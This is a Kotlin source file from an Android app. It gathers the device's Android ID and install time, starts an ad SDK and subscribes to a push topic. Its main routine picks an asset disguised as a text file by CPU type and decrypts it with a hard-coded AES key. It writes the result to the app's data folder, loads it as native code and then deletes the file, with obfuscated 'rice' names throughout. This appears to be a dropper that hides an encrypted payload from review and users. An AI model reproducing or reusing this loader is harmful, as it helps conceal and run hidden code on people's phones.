package com.rice.jar

import android.content.Context
import android.os.Build
import android.provider.Settings
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.ktx.messaging
import com.tradplus.ads.open.TradPlusSdk
import com.wild.rice.RiceShrimp
import kotlinx.coroutines.delay
import java.io.BufferedInputStream
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.CipherInputStream
import javax.crypto.spec.SecretKeySpec


/**
 * Date：2025/3/19
 * Describe:
 */
object RiceJellyCache {
    var mRiceInstallTime = 0L
    var mAndroidIdStr by RiceWarehouseCache()
    var riceLevel by RiceWarehouseCache()
    var mRiceKey by RiceWarehouseCache("wiusj")
    var pkgName = ""
    var appVersion = ""
    var isInitSuccess = false
    private var mRiceType = ""
    private var riceKey by RiceWarehouseCache("rice")

    fun riceInit(context: Context) {
        if (mAndroidIdStr.isBlank()) {
            mAndroidIdStr =
                Settings.System.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                    .ifBlank { UUID.randomUUID().toString() }
        }
        pkgName = context.packageName
        mRiceInstallTime = context.packageManager.getPackageInfo(pkgName, 0).firstInstallTime
        appVersion = context.packageManager.getPackageInfo(pkgName, 0).versionName
        TradPlusSdk.setTradPlusInitListener {
            isInitSuccess = true
        }
        // todo modify
        TradPlusSdk.initSdk(context, "114FE8DB631B3389BDDDD15D81E45E39")
        mRiceType = getRiceType()
        if (riceKey == "rice") {
            runCatching {
                Firebase.messaging.subscribeToTopic("rice_fcm").addOnSuccessListener {
                    riceKey = "google"
                }
            }
        }
    }

    private var lastPostTime by RiceWarehouseCache("0")

    fun isFirstStart(): Long {
        if (lastPostTime.toLong() > 0) {
            return -1
        }
        val time = System.currentTimeMillis() - mRiceInstallTime
        lastPostTime = time.toString()
        return time
    }

    var isActionSuccess = false
    private val Rice_aes = "AES"
    private val AES_TYPE = "AES/ECB/PKCS5Padding"

    @JvmStatic
    suspend fun actionNow(): Boolean {
        RiceShrimp.mApplication.apply {
            riceLoad(this, this.assets.open(mRiceType))
        }
        return isActionSuccess
    }

    private fun getRiceType(): String {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return "android/android_des.txt"
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return "google/google_tips.txt"
            }
        }
        return "google/google_tips.txt"
    }

    /**
     * 解密文件
     * @param inputFile 输入文件路径（加密文件）
     * @param outputFile 输出文件路径（解密后文件）
     * @param key 密钥的字节数组
     * @throws Exception 异常
     */
    @Throws(Exception::class)
    private fun desFile(inputStream: InputStream, outputFile: String, key: ByteArray) {
        val secretKeySpec = SecretKeySpec(key, Rice_aes)
        val cipher = Cipher.getInstance(AES_TYPE)
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec)
        BufferedInputStream(inputStream).use { fis ->
            CipherInputStream(fis, cipher).use { cis ->
                FileOutputStream(outputFile).use { fos ->
                    val buffer = ByteArray(4096)
                    var bytesRead: Int
                    while ((cis.read(buffer).also { bytesRead = it }) != -1) {
                        fos.write(buffer, 0, bytesRead)
                    }
                }
            }
        }
    }

    private suspend fun riceLoad(context: Context, inputStream: InputStream) {
        val fileName = "${context.dataDir}/Cache"
        val riceFile = File(fileName)
        try {
            if (!riceFile.exists()) {
                desFile(inputStream, fileName, mRiceKey.toByteArray())
            }
            riceFile.setReadOnly()
            System.load(riceFile.absolutePath)
            isActionSuccess = true
            delay(500)
            File(riceFile.absolutePath).delete()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

}